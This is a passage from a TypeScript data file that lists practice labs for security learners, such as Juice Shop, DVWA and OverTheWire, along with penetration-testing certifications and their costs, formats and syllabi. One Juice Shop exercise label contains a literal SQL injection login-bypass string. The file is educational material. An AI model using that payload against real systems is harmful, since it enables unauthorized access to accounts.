      "Starting Point (Tier 0, 1, 2 - Meow, Fawn, Archetype)",
      "Lame (Classic Samba exploitation)",
      "Jerry (Apache Tomcat Manager WAR file deployment)",
      "Blue (EternalBlue MS17-010)",
      "HTB Academy Web Security Modules",
    ],
  },
  {
    name: "OWASP Juice Shop",
    difficulty: "Beginner",
    category: "Locally Hosted Vulnerable Apps",
    url: "https://owasp.org/www-project-juice-shop/",
    description: "The most modern and sophisticated intentionally insecure web application built with Node.js, Express, and Angular. Includes a built-in gamified scoreboard.",
    recommendedRooms: [
      "SQLi Login Bypass (admin' or 1=1--)",
      "XSS in search bar and customer feedback",
      "IDOR in customer basket endpoints",
      "Forging arbitrary JWT administrator tokens",
      "Exposed Swagger UI & sensitive FTP downloads",
    ],
  },
  {
    name: "DVWA (Damn Vulnerable Web Application)",
    difficulty: "Beginner",
    category: "Locally Hosted Vulnerable Apps",
    url: "https://dvwa.co.uk",
    description: "Classic PHP/MySQL vulnerable web application. Features adjustable security levels (Low, Medium, High, Impossible) to learn filter evasion step-by-step.",
    recommendedRooms: [
      "Command Injection Low to High bypass",
      "File Inclusion with Null Byte and path traversal",
      "SQL Injection & Blind SQL Injection",
      "File Upload with MIME and extension bypasses",
      "CSRF Password Change exploitation",
    ],
  },
  {
    name: "OverTheWire (Bandit & Natas)",
    difficulty: "Beginner",
    category: "Wargames & Live Contests",
    url: "https://overthewire.org/wargames/",
    description: "The quintessential CLI wargame. Bandit teaches Linux command line mastery from scratch; Natas teaches server-side web security mechanics level by level.",
    recommendedRooms: [
      "Bandit Levels 0 to 25 (Linux terminal fluency)",
      "Natas Levels 0 to 20 (Web security, source review, SQLi)",
    ],
  },
];

// ─── 6. CERTIFICATION BLUEPRINT & GUIDELINES ───────────────────────────────
export const deepCertificationsList: DeepCertificationGuide[] = [
  {
    name: "eJPT (eLearnSecurity Junior Penetration Tester)",
    provider: "INE Security",
    level: "Entry Level",
    cost: "$249 USD",
    format: "48-Hour Hands-on Practical Lab Exam",
    description: "The best entry-level practical certification for aspiring penetration testers. Requires zero multiple-choice memorization — you are dropped into a virtual network and must answer questions by actually hacking targets.",
    keySyllabus: [
      "TCP/IP Networking, Wireshark & Routing",
      "Nmap, Masscan, Nessus vulnerability assessment",
      "Web application reconnaissance & SQLi / XSS exploitation",
      "Metasploit, manual exploitation & basic pivoting",
    ],
  },
  {
    name: "eWPT (eLearnSecurity Web Application Penetration Tester)",
    provider: "INE Security",
    level: "Intermediate",
    cost: "$400 USD",
    format: "10-Day Practical Lab Exam + Formal Pentest Report",
    description: "Dedicated 100% to web application security testing. Simulates a real commercial client engagement where you must compromise the web app and submit an executive-ready penetration test report.",
    keySyllabus: [
      "Advanced Burp Suite interception & automation",
      "In-depth manual SQL injection & XSS filter evasion",
      "Bypassing WAFs, authorization tokens & SSRF",
      "Drafting commercial VAPT remediation reports",
    ],
  },
  {
    name: "BSCP (Burp Suite Certified Practitioner)",
    provider: "PortSwigger",
    level: "Intermediate",
    cost: "$99 USD",
    format: "4-Hour Fast-Paced Practical Exam",
    description: "PortSwigger's official credential validating high-speed manual web security testing using Burp Suite Professional. Highly respected by bug bounty teams worldwide.",
    keySyllabus: [
      "Complex multi-stage web application attack chains",
      "Combining XSS with CSRF to take over admin accounts",
      "HTTP request smuggling & cache poisoning exploitation",
      "Deserialization, XXE, and advanced SSTI RCE",
    ],
  },
  {
    name: "OSCP (Offensive Security Certified Professional)",
    provider: "OffSec",
    level: "Advanced Professional",
    cost: "$1,649 USD",
    format: "24-Hour Intensive Exam + 24-Hour Report Submission",
    description: "The gold standard industry benchmark certification. Proves relentless persistence, technical competence, and the 'Try Harder' mindset required for senior security consultant roles.",
    keySyllabus: [
      "Active Directory exploitation (Kerberoasting, BloodHound, DCSync)",
      "Web enumeration to initial foothold",
      "Linux and Windows local privilege escalation",
      "Tunneling, port forwarding & internal network pivoting",
    ],
  },
];
